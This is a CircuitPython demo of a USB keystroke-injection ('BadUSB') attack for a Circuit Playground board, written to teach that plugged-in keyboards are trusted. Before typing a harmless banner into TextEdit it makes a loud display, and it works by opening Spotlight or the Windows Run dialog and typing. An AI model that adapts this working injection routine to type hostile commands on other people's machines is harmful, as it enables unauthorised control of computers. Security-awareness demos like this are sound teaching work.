"""01 - The World's Most Obvious BadUSB.

A real HID keystroke-injection attack that first flashes police lights and
screams out of the buzzer. The joke makes the point: a keyboard is trusted
implicitly, so anything you plug in that *acts* like a keyboard can type for
you. A real attack is silent -- this one is as loud as possible on purpose.

Single-file + memory-lean for the SAMD21 (~32KB RAM): helpers are inlined and
adafruit_hid is imported only at fire time, after a gc.collect().

ARM:     slide the switch to the left (speaker/ear side). Fires once; toggle the
         switch off and back on to run it again.
PAYLOAD: 100% harmless -- opens TextEdit (macOS) and types a banner.
"""

import gc
import time
from adafruit_circuitplayground import cp

BANNER = (
    ">>> THE WORLD'S MOST OBVIOUS BADUSB <<<\n\n"
    "A keyboard just typed this by itself.\n"
    "A real attacker's 'keyboard' would NOT flash lights or beep first.\n"
    "Lesson: never plug in USB you don't trust. See the repo's ETHICS.md.\n"
)


def police(flashes=10, delay=0.07):
    for n in range(flashes):
        on = n % 2 == 0
        for i in range(5):
            cp.pixels[i] = (255, 0, 0) if on else (0, 0, 0)
        for i in range(5, 10):
            cp.pixels[i] = (0, 0, 255) if on else (0, 0, 0)
        time.sleep(delay)
    cp.pixels.fill((0, 0, 0))


def siren(low=440, high=1760, step=25, dwell=0.004):
    for hz in range(low, high, step):
        cp.start_tone(hz)
        time.sleep(dwell)
    for hz in range(high, low, -step):
        cp.start_tone(hz)
        time.sleep(dwell)
    cp.stop_tone()


def payload():
    gc.collect()
    import usb_hid
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keycode import Keycode
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
    time.sleep(2)  # let USB finish enumerating before typing

    # The whole gag: make a scene BEFORE doing anything.
    cp.start_tone(1200)
    police()
    cp.stop_tone()
    siren()

    # The actual injection: open an app and type.
    # (Windows: use Keycode.WINDOWS, Keycode.R and type the app/command instead.)
    kbd.send(Keycode.GUI, Keycode.SPACE)   # Spotlight
    time.sleep(0.6)
    layout.write("TextEdit")
    time.sleep(0.4)
    kbd.send(Keycode.ENTER)
    time.sleep(1.5)
    kbd.send(Keycode.GUI, Keycode.N)       # force a fresh document
    time.sleep(0.8)
    layout.write(BANNER)

    for _ in range(3):                     # green = done
        cp.pixels.fill((0, 60, 0))
        time.sleep(0.2)
        cp.pixels.fill((0, 0, 0))
        time.sleep(0.2)
    gc.collect()


fired = False
while True:
    if cp.switch:                          # armed = switch to the left
        if not fired:
            payload()
            fired = True
    else:
        fired = False                      # re-arm on toggle
        cp.pixels.brightness = 0.1         # calm idle shimmer
        cp.pixels.fill((0, 0, 40))
    time.sleep(0.1)
